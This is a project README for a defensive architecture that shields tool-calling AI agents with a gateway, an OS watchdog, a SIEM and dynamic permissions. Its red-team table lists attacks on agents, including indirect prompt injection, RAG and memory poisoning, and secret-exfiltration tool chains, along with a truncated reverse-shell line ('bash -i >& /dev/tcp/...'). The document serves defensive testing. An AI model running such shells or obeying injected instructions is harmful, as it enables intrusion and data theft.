
#  Agentic Defense Matrix (ADM)

> **The Unified Blue/Green Team Architecture for Agentic AI Systems**

一個針對具備自主規劃與工具調用（Tool-calling）能力的 Agentic AI 所設計的縱深防禦系統。本專案屏棄傳統僅依賴「提示詞過濾」的無效防護，透過作業系統底層遙測（Telemetry）、動態權限管控與狀態感知 SIEM，徹底限制 AI 代理的爆炸半徑。

---

## Objective

Build a defense matrix covering L7 API Gateway to OS Endpoint layers. Ensure that when agents face **Indirect Prompt Injection (Data Poisoning)**, **Confused Deputy Attacks**, or **State Drift**, the system actively identifies semantic anomalies and blocks unauthorized syscalls and data exfiltration at the OS level.

## Methods

Blue Team detection + Green Team isolation:

1. **Cross-dimensional Telemetry:** Gateway semantic analysis combined with OS-level (WFP / macOS Endpoint Security) process/network interception.
2. **Stateful SIEM:** Time-series correlation of natural language intent with underlying syscalls.
3. **Zero Trust & Micro-segmentation:** Dynamic IAM privilege downgrade with ephemeral agent sandboxing.

## Constraints

- **Performance:** Network interception and SIEM correlation must add < 50ms latency.
- **Stateless Agents:** All state managed externally for instant container destruction.
- **Egress Filtering:** Default-deny outbound except whitelisted APIs.

---

## Tech Stack

| Component | Technology | Purpose |
|-----------|-----------|---------|
| API Gateway | Go (Echo) | Request interception, semantic analysis, routing |
| Agent Services | Go + gRPC | Planner, Executor, Summarizer (separate containers) |
| LLM Backend | Ollama | Local inference: llama3.1:8b, qwen2.5:7b, mistral |
| Endpoint Watchdog | Rust | macOS ES + Windows WFP syscall interception |
| SIEM Engine | Go | Correlation engine + Redis Streams |
| Policy Engine | OPA + SPIRE | Rego policies + workload identity |
| Sandboxing | Docker API | Ephemeral per-agent containers |
| Storage | Redis 7 | SIEM hot path (7d hot / 180d cold) |
| Observability | OpenTelemetry | Traces, metrics, logs |
| CI/CD | GitHub Actions | Matrix build: windows/amd64, darwin/amd64+arm64, linux/amd64 |

---

## Repository Structure

```
agentic-defense-matrix/
├── .github/
│   └── workflows/
│       ├── ci.yml                 # Go & Rust tests + lint
│       ├── release.yml            # Cross-platform packaging
│       └── red_team_fuzz.yml      # Red team attack suite
├── cmd/
│   ├── gateway/                   # API Gateway + semantic middleware
│   ├── siem_engine/               # SIEM correlation engine
│   ├── control_plane/             # Auto-update server
│   └── agent/
│       ├── planner/               # Task decomposition agent
│       ├── executor/              # Tool execution agent
│       └── summarizer/            # Response summarization agent
├── pkg/
│   ├── auth/                      # OPA + SPIRE client, JWT management
│   ├── semantic/                  # Prompt vectorization + intent comparison
│   ├── telemetry/                 # OTel instrumentation helpers
│   ├── ollama/                    # Ollama HTTP API wrapper
│   ├── policy/                    # OPA Rego evaluation client
│   ├── ringbuffer/                # Lock-free SPSC ring buffer
│   └── proto/                     # Protobuf service definitions
├── agents/
│   └── schemas/                   # OpenAI-compatible tool definitions
├── daemon_watchdog/               # Rust endpoint watchdog
│   ├── Cargo.toml
│   └── src/
│       ├── main.rs
│       ├── wfp_filter.rs          # Windows Filtering Platform
│       ├── macos_es.rs            # macOS Endpoint Security
│       ├── egress_blocker.rs      # Dynamic egress blocking
│       ├── policy_enforcer.rs     # OPA policy evaluation
│       └── telemetry.rs           # OTel event export
├── deploy/
│   ├── docker-compose.yml         # Full stack orchestration
│   ├── Dockerfile.go              # Multi-stage Go build
│   ├── Dockerfile.rust            # Rust watchdog build
│   ├── Dockerfile.opa             # OPA sidecar
│   ├── watchdog.toml              # Watchdog configuration
│   ├── otel-collector.yaml        # OTel Collector config
│   ├── packaging/                 # Platform installers
│   │   ├── windows/               # MSI + PowerShell
│   │   ├── macos/                 # .pkg + launchd
│   │   └── linux/                 # tar.gz + systemd
│   └── spire/                     # SPIRE + OPA policies
├── docs/
│   ├── architecture/
│   │   ├── system-overview.md     # Mermaid architecture diagrams
│   │   ├── c4-container.puml      # PlantUML C4 model
│   │   ├── deployment.md          # Deployment architecture
│   │   ├── data-flow.md           # Data flow diagrams
│   │   └── security.md            # Security architecture
│   ├── threat-model.md            # MITRE ATLAS threat mapping
│   └── adr/                       # Architecture Decision Records
│       ├── 001-opa-spire-auth.md
│       ├── 002-redis-streams-siem.md
│       ├── 003-separate-agent-services.md
│       ├── 004-rust-watchdog.md
│       └── 005-ollama-llm.md
├── tests/
│   ├── integration/               # Blue/green team integration tests
│   └── redteam/                   # Red team attack harnesses
├── scripts/
│   └── setup-dev.sh               # Development environment setup
├── .editorconfig
├── .golangci.yml
├── Makefile
├── buf.yaml                       # Protobuf lint config
├── buf.gen.yaml                   # Protobuf code generation
├── go.mod
└── README.md
```

---

## Implementation Methods

1. **L7 Semantic Defense (Gateway):** Go middleware intercepts all agent requests, computes short-window semantic similarity to block automated probing.
2. **OS Behavior Containment (Endpoint):** Rust watchdog daemon with WFP/ES filters binds agent socket connections to session IDs.
3. **Green Team Auto-Response:** SIEM triggers webhook → Gateway revokes session IAM → Watchdog SIGKILLs container + blocks egress.

---

## Implementation Plan

### Phase 1: Architecture & Sandboxing (Weeks 1-2)
- Separate agent dialogue and execution modules
- Build Docker ephemeral execution environments
- Ollama wrapper with tool-calling support
- Protobuf service definitions
- Docker Compose orchestration

### Phase 2: Endpoint Interceptor (Weeks 3-4)
- Rust watchdog with macOS Endpoint Security
- Windows WFP filter implementation
- Egress blocking with dynamic whitelisting
- Cross-platform packaging (MSI, .pkg, tar.gz)

### Phase 3: SIEM Correlation Engine (Weeks 5-6)
- Lock-free ring buffer for hot-path ingestion
- Redis Streams for event persistence
- MITRE ATLAS-based correlation rules
- OTel instrumentation

### Phase 4: Dynamic Permissions & Auto-Response (Weeks 7-8)
- OPA + SPIRE integration
- Token revocation on threat detection
- Egress drop on anomalous behavior
- End-to-end integration testing

---

## Acceptance Criteria

| Stage | Attack (Red Team) | Expected Defense (Blue/Green) | Pass Criteria |
|-------|-------------------|-------------------------------|---------------|
| Stage 1: API Boundary | High-frequency semantic prompt injection | Gateway detects semantic anomaly | Rate limit triggered, 95% probes blocked |
| Stage 2: Logic Abuse | Confused deputy: chain read_secret → external_send | Watchdog captures anomaly, SIEM fires rule | IAM revoked, egress denied by sandbox |
| Stage 3: System Penetration | RAG poisoning → reverse shell spawn | macOS ES / WFP intercepts unauthorized exec (e.g., `bash -i`) | Process creation fails, container destroyed |

---

## Red Team Test Suite

Located in `tests/redteam/`, implemented in Go/Rust:

| ID | Attack | Technique |
|----|--------|-----------|
| RT-001 | Prompt Injection | Indirect injection via RAG context |
| RT-002 | Tool Chaining | read_secret → external_send chain |
| RT-003 | RAG Poisoning | Inject malicious URLs into knowledge base |
| RT-004 | Reverse Shell | `bash -i >& /dev/tcp/...` via tool call |
| RT-005 | Confused Deputy | Trick agent into privilege escalation |
| RT-006 | Token Theft | Replay captured JWT |
| RT-007 | Egress Exfiltration | DNS tunnel / HTTP POST to external |
| RT-008 | Container Escape | Mount host filesystem attempts |
| RT-009 | Rate Abuse | 1000 req/min automated probing |
| RT-010 | State Drift | Modify agent context mid-session |
| RT-011 | LLM Supply Chain | Compromised Ollama model |
| RT-012 | Log Injection | Crafted payloads in user input |
| RT-013 | TOCTOU Race | Race condition in policy check |
| RT-014 | DNS Rebinding | Bypass egress filter via DNS |
| RT-015 | Privilege Escalation | Exploit Watchdog → root |
| RT-016 | Indirect Tool Output | Inject malicious instructions in tool output |
| RT-017 | Multi-Turn Context | Build trust then exploit across turns |
| RT-018 | Encoding Injection | Base64/hex encoded payloads |
| RT-019 | Multi-Language | Injection in multiple languages |
| RT-020 | Nested Injection | Nested system/user/assistant markers |
| RT-021 | Social Engineering | Fake admin/emergency commands |
| RT-022 | Payload Obfuscation | Variable splitting, concatenation |
| RT-023 | Supply Chain | Malicious package installation |
| RT-024 | Time-Based | Delayed trigger injection |
| RT-025 | Resource Exhaustion | Large payloads, concurrent requests |
| RT-026 | Memory Poisoning | Poison agent conversation memory |
| RT-027 | Cross-Session | Contaminate other sessions |
| RT-028 | Token Extraction | Extract API keys/tokens |
| RT-029 | Denial of Service | Excessive token generation |
| RT-030 | Side Channel | Data exfiltration via encoding |

---

## Quick Start

```bash
# Setup development environment
./scripts/setup-dev.sh

# Start infrastructure
docker compose up -d redis ollama

# Pull LLM model
ollama pull llama3.1:8b

# Build everything
make build

# Run tests
make test

# Start full stack
make docker-up
```

---

## Auto-Update System

Gateway includes built-in auto-update client that polls GitHub Releases:

- **Background check**: Every 1 hour, checks for new releases
- **SHA256 verification**: Verifies checksums before applying
- **Binary replacement**: Downloads and replaces binaries in-place
- **Service restart**: Restarts the service after update (systemd/launchd)

**Admin endpoints:**
- `GET /v1/version` — Current version
- `POST /v1/admin/update/check` — Check for updates

**Environment variables:**
- `ADM_GITHUB_OWNER` — GitHub repo owner (default: `Jest-Test-Team`)
- `ADM_GITHUB_REPO` — GitHub repo name (default: `Agentic-Defense-Matrix-ADM-`)

## Deployment

### Docker Compose (Recommended)

```bash
# Start full stack
docker compose up -d

# Start with development mode
docker compose -f docker-compose.yml -f docker-compose.dev.yml up -d
```

### Platform Installers

| Platform | Installer | Service Manager |
|----------|-----------|-----------------|
| Windows | `deploy/packaging/windows/install.ps1` | Windows Service |
| macOS | `deploy/packaging/macos/install.sh` | launchd |
| Linux | `deploy/packaging/linux/install.sh` | systemd |

### Oracle Cloud Terraform

GitHub Actions workflow: `.github/workflows/terraform-oci.yml`

Required repository secrets:

| Secret | Description |
|--------|-------------|
| `OCI_TENANCY_OCID` | OCI tenancy OCID |
| `OCI_USER_OCID` | OCI API user OCID |
| `OCI_FINGERPRINT` | OCI API key fingerprint |
| `OCI_PRIVATE_KEY` | PEM contents of the OCI API private key |
| `ADM_SSH_PUBLIC_KEY` | SSH public key installed on the ADM instance |

Optional repository settings:

| Setting | Type | Default |
|---------|------|---------|
| `OCI_REGION` | Secret | `us-ashburn-1` |
| `ADM_OCPUS` | Variable | `4` |
| `ADM_MEMORY_IN_GBS` | Variable | `24` |
| `ADM_VOLUME_SIZE_GBS` | Variable | `100` |
| `ADM_DOCKER_COMPOSE_VERSION` | Variable | `v2.29.1` |

Pull requests run `terraform fmt`, `init`, and `validate`. Pushes to `main` run a plan. Use the manual **Terraform OCI** workflow dispatch with `action=apply` and `auto_approve=true` to deploy to OCI, or `action=destroy` and `auto_approve=true` to tear it down.

The current Terraform backend is local, so the workflow caches `terraform.tfstate` between manual runs. For long-lived or shared infrastructure, move state to a real remote backend before relying on this from multiple branches or operators.

### Manual Installation

```bash
# Build from source
make build

# Install binaries
sudo cp bin/* /usr/local/bin/

# Create systemd service
sudo cp deploy/packaging/linux/adm.service /etc/systemd/system/
sudo systemctl daemon-reload
sudo systemctl enable adm
sudo systemctl start adm
```

## Documentation

- [System Architecture](docs/architecture/system-overview.md) — Mermaid diagrams
- [C4 Container Model](docs/architecture/c4-container.puml) — PlantUML
- [Deployment Architecture](docs/architecture/deployment.md) — Service matrix
- [Data Flow](docs/architecture/data-flow.md) — Event pipelines
- [Security Architecture](docs/architecture/security.md) — Zero trust model
- [Threat Model](docs/threat-model.md) — MITRE ATLAS mapping
- [ADRs](docs/adr/) — Architecture decision records

---

## References

1. [MITRE ATLAS](https://atlas.mitre.org/) — Threat tactics (AML.T0051, AML.T0052, AML.T0054)
2. [OWASP Top 10 for LLM Applications](https://owasp.org/www-project-top-10-for-large-language-model-applications/) — LLM01, LLM06, LLM08
3. [BIML Architectural Risk Analysis](https://berryvilleiml.com/) — Data/instruction boundary principles
4. [CSA AI Safety Guidelines](https://cloudsecurityalliance.org/) — Dynamic IAM, microservice isolation
5. [Harvard CS 2881: AI Safety](https://cs2881.seas.harvard.edu/) — Model specs, red/blue team, jailbreak theory
